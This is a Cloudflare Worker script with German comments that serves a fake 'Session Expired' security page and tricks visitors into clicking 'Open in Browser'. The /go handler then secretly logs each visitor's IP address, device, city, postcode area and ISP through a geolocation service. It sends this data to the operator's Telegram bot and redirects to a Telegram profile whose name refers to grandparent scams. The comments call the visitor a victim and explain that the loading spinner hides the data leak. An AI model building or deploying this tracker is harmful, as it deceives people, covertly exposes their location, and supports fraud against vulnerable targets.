export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // --- TEIL 1: DIE FAKE-WEBSITE (Startseite) ---
    if (url.pathname === "/" || url.pathname === "/leak") {
      const tag = url.searchParams.get('c') || 'default';
      
      const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Security Gateway</title>
          <style>
              body { 
                  background-color: #0a0a0a; 
                  color: #ffffff; 
                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
                  display: flex; 
                  justify-content: center; 
                  align-items: center; 
                  height: 100vh; 
                  margin: 0; 
                  text-align: center; 
              }
              .container { 
                  background: #141414; 
                  padding: 50px 30px; 
                  border-radius: 12px; 
                  border: 1px solid #2a2a2a; 
                  max-width: 380px; 
                  width: 90%; 
                  box-shadow: 0 20px 40px rgba(0,0,0,0.6); 
              }
              h1 { 
                  color: #ffffff; 
                  font-size: 20px; 
                  margin-bottom: 15px; 
                  font-weight: 600;
                  letter-spacing: 0.5px;
              }
              p { 
                  color: #888888; 
                  font-size: 14px; 
                  margin-bottom: 35px; 
                  line-height: 1.6; 
              }
              .btn { 
                  display: block; 
                  width: 100%; 
                  padding: 16px; 
                  background-color: #ffffff; 
                  color: #000000; 
                  text-decoration: none; 
                  font-weight: 600; 
                  font-size: 15px; 
                  border-radius: 8px; 
                  box-sizing: border-box; 
                  transition: all 0.3s ease; 
                  border: none;
                  cursor: pointer;
              }
              .btn:hover { 
                  background-color: #e0e0e0; 
                  transform: translateY(-1px);
              }
              /* Der Loading Circle */
              .spinner {
                  display: none;
                  width: 24px;
                  height: 24px;
                  border: 3px solid rgba(0,0,0,0.1);
                  border-top-color: #000000;
                  border-radius: 50%;
                  animation: spin 0.8s linear infinite;
                  margin: 0 auto;
              }
              @keyframes spin { to { transform: rotate(360deg); } }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>Session Expired</h1>
              <p>This session is not supported. Please open in a secure browser to continue.</p>
              
              <a href="/go?c=${tag}" class="btn" id="redirectBtn" onclick="startLoading()">
                  <span id="btnText">Open in Browser</span>
                  <div class="spinner" id="btnSpinner"></div>
              </a>
          </div>

          <script>
              function startLoading() {
                  // Verstecke den Text
                  document.getElementById('btnText').style.display = 'none';
                  // Zeige den Spinner
                  document.getElementById('btnSpinner').style.display = 'block';
                  // Verhindere doppeltes Klicken
                  document.getElementById('redirectBtn').style.pointerEvents = 'none';
                  document.getElementById('redirectBtn').style.opacity = '0.8';
              }
          </script>
      </body>
      </html>
      `;
      return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }

    // --- TEIL 2: DER LOGGER & REDIRECT ---
    if (url.pathname === "/go") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "unknown";
      const tag = url.searchParams.get("c") || "unbekannt";
      const t = new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" });

      let ipVersion = "Unbekannt";
      let loc = "Unbekannt";
      let isp = "Unbekannt";
      let asn = "Unbekannt";
      let postal = "Unbekannt";
      let continent = "Unbekannt";

      try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,isp,org,as,continent,query`);
        const data = await res.json();
        
        if (data.status === "success") {
          ipVersion = ip.includes(':') ? "IPv6" : "IPv4";
          loc = `${data.zip || '?'} ${data.city || '?'}, ${data.regionName || '?'}, ${data.country || '?'}`;
          isp = data.isp || "?";
          asn = `${data.as || '?'} (${data.org || '?'})`;
          continent = data.continent || "?";
        }
      } catch (e) {}

      if (env.BOT_TOKEN && env.CHAT_ID) {
        const msg = 
          `[${tag}]\n` +
          `------------------------\n` +
          `IP: ${ip} (${ipVersion})\n` +
          `Ort: ${loc}\n` +
          `Kontinent: ${continent}\n` +
          `Provider: ${isp}\n` +
          `ASN/Org: ${asn}\n` +
          `Zeit: ${t}\n` +
          `------------------------\n` +
          `Device: ${ua}`;

        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: env.CHAT_ID, text: msg })
          });
        } catch (e) {}
      }

      // 1.5 Sekunden warten, damit die Animation auf dem Handy des Opfers sichtbar ist,
      // während im Hintergrund die Nachricht an Telegram rausgeht.
      await new Promise(r => setTimeout(r, 1500));

      // Weiterleitung zu deinem Profil
      return Response.redirect("https://t.me/enkeltrickbetrger", 302);
    }

    return new Response("404 Not Found", { status: 404 });
  }
};
